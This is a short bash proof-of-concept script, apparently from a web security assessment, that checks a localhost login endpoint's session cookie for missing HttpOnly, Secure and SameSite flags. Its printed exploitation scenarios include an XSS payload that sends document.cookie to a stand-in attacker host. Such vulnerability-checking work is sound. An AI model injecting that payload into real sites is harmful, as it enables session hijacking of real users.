#!/bin/bash

# POC: Missing HttpOnly and Secure Flags on Session Cookie
# This script demonstrates that the PHPSESSID session cookie lacks
# HttpOnly and Secure flags, making it vulnerable to XSS and MITM attacks

TARGET_URL="http://localhost:8080/api/login.php"

echo "=== Session Cookie Security Flags Vulnerability POC ==="
echo ""
echo "Target: $TARGET_URL"
echo "Making login request and analyzing Set-Cookie header..."
echo ""

# Make login request and capture response headers
RESPONSE=$(curl -s -i -X POST "$TARGET_URL" \
    -d "username=test&password=test" \
    2>/dev/null)

# Extract Set-Cookie header
SET_COOKIE=$(echo "$RESPONSE" | grep -i "^Set-Cookie:" | head -1)

echo "Set-Cookie Header Found:"
echo "$SET_COOKIE"
echo ""

# Check for security flags
echo "=== Security Flags Analysis ==="
echo ""

HTTPONLY_PRESENT=0
SECURE_PRESENT=0
SAMESITE_PRESENT=0
VULNERABILITY_FOUND=0

if echo "$SET_COOKIE" | grep -qi "HttpOnly"; then
    echo "✓ HttpOnly flag: PRESENT"
    HTTPONLY_PRESENT=1
else
    echo "✗ HttpOnly flag: MISSING (VULNERABLE)"
    VULNERABILITY_FOUND=1
fi

if echo "$SET_COOKIE" | grep -qi "Secure"; then
    echo "✓ Secure flag: PRESENT"
    SECURE_PRESENT=1
else
    echo "✗ Secure flag: MISSING (VULNERABLE)"
    VULNERABILITY_FOUND=1
fi

if echo "$SET_COOKIE" | grep -qi "SameSite"; then
    echo "✓ SameSite attribute: PRESENT"
    SAMESITE_PRESENT=1
else
    echo "✗ SameSite attribute: MISSING (VULNERABLE)"
    VULNERABILITY_FOUND=1
fi

echo ""
echo "=== Vulnerability Assessment ==="
echo ""

if [ "$VULNERABILITY_FOUND" -eq 1 ]; then
    echo "✓ VULNERABILITY CONFIRMED: Session cookie lacks required security flags"
    echo ""
    if [ "$HTTPONLY_PRESENT" -eq 0 ]; then
        echo "- WITHOUT HttpOnly: JavaScript can access the cookie via document.cookie"
        echo "  Risk: XSS-based session hijacking attacks"
    fi
    if [ "$SECURE_PRESENT" -eq 0 ]; then
        echo "- WITHOUT Secure: Cookie will be transmitted over HTTP connections"
        echo "  Risk: Man-in-the-Middle (MITM) session interception attacks"
    fi
    if [ "$SAMESITE_PRESENT" -eq 0 ]; then
        echo "- WITHOUT SameSite: Cookie sent in cross-site requests"
        echo "  Risk: Cross-Site Request Forgery (CSRF) attacks"
    fi
    
    echo ""
    echo "=== Exploitation Scenarios ==="
    echo ""
    echo "Attack 1 - XSS Session Hijacking:"
    echo "  Attacker injects: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"
    echo "  Result: Session cookie sent to attacker's server in plaintext"
    echo ""
    echo "Attack 2 - MITM Interception:"
    echo "  Attacker intercepts unencrypted HTTP traffic"
    echo "  Result: PHPSESSID captured and used to hijack user session"
    echo ""
    echo "Attack 3 - CSRF with Cookie:"
    echo "  Attacker's website makes requests to vulnerable application"
    echo "  Result: User's cookie automatically sent, authorizing attacker's actions"
    
    echo ""
    echo "✓ POC SUCCESSFUL: Vulnerability has been demonstrated"
    exit 0
else
    echo "SECURE: All required flags are present on session cookie"
    exit 0
fi